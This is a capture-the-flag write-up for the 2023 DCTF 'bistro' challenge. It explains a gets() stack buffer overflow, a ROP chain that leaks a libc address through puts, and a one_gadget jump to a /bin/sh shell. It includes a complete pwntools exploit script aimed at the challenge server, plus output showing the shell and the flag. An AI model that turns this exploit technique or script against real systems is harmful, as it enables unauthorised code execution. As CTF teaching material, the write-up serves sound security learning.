# 2023 DCTF - bistro

We are provided with a single `restaurant` binary:
```
$ file restaurant 
restaurant: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cea7843fdb48a2960a3e5a489182d1b3de25f2f0, not stripped
```

The `restaurant` binary offers to select a meal from a menu and then prints out the selected value or, in case of "Custom dinner" prints "Wrong choice":
```
$ ./restaurant 
==============================
              MENU             
==============================
1. Chessburger...............2$
2. Hamburger.................3$
3. Custom dinner............10$
>> 3
Choose what you want to eat:
Wrong choice
```

Since the second version of the challenge called bistro-v2 provided also a libc shared object, we decided to bet that the same libc is used for both versions of the challenges and immediately create a solution that works for both challenges:
```
$ file libc-2.27.so 
libc-2.27.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=71f0f3074a929e519e85f6a5c03a7d1fd976bfe4, for GNU/Linux 3.2.0, stripped
```

The disassembly of the `restaurant` binary shows a buffer overflow vulnerability present inside `custom` function that is called once "Custom dinner" is selected from a list of options:
```
undefined8 custom(void)

{
  char local_78 [112];
  
  printf("Choose what you want to eat:");
  gets(local_78);
  gets(local_78);
  return 0;
}
```

Here is how it looks when interacting with the binary:
```
$ ./restaurant 
==============================
              MENU             
==============================
1. Chessburger...............2$
2. Hamburger.................3$
3. Custom dinner............10$
>> 3
Choose what you want to eat:AAAAAAAAAAAAAAAAAAAAAAAAAAeat:AAAAAAAAAAAAAAAAAAAAAAAAAAeat:AAAAAAAAAAAAAAAAAAAAAAAAAAeat:AAAAAAAAAAAAAAAAAAAAAAAAAAeat:AAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

In order to obtain a shell, we have decided to perform the following ROP chain:
- 0x4008a3 which is `pop rdi ; ret` gadget
- 0x601030 which is address of `gets@got.plt` that is popped to `rdi`
- 0x4006b0 which is the `puts` function

The initial ROP chain is basically a call to `puts(gets@got.plt)` that effectively leaks the gets address.

We use the address leak to calculate the libc base address which can be further used to redirect to a "one gadget". A "one gadget" is a single gadget ROP chain that performs an `execve("/bin/sh", NULL, NULL)` call inside libc.

In order to execute a "one gadget", we re-run the `custom` function at `0x40072a` and overflow to an address pointing to our "one gadget" to pop spawn a shell.


The exact "one gadget" used was determined via trial and error: if first one fails, we take another one until we hopefully pop a shell:
```
$ one_gadget libc-2.27.so 
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Here is how the attack vector looks inside of a script:
```python
from pwn import *

# libc from bistro-v2
LIBC_PATH = "./libc-2.27.so"

r = remote('35.198.135.192', 32327)
#r = gdb.debug("./restaurant", '''break *0x4008a1
#''')
r.recvuntil(b">> ")
r.sendline(b"3")
r.recvuntil(b"eat:")

payload  = b'A'*120
payload += p64(0x004008a3)        # pop rdi ; ret
payload += p64(0x00601030)        # plt
payload += p64(0x004005b0)        # puts
payload += p64(0x0040072a)        # back to roots

r.sendline(payload)
a = r.recvuntil(b"eat:")
g = a.split(b'\n')[0]
print(g)
gets_ptr = int.from_bytes(g, 'little')
print(gets_ptr)

l = ELF(LIBC_PATH)
l.address = gets_ptr - l.sym["gets"]

payload  = b'A'*120
payload += p64(l.address + 0x4f302)
r.sendline(payload)
r.interactive()
```

Successful execution renders the flag:
```
$ python3 xpl.py 
[+] Opening connection to 35.198.135.192 on port 32327: Done
b'\x90\xc1CX.\x7f'
139837026058640
[*] '/home/vm/Downloads/dctf/bistro/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
$ id
$ id
uid=1000(bv-arena) gid=3000 groups=3000,2000
$ ls
flag  restaurant  restaurant.c
$ cat flag
CTF{33be4238b68642a4c3f97d10cfa034764e0b6d9707d6970f581200e2b7bcbfc0}
$ 
```
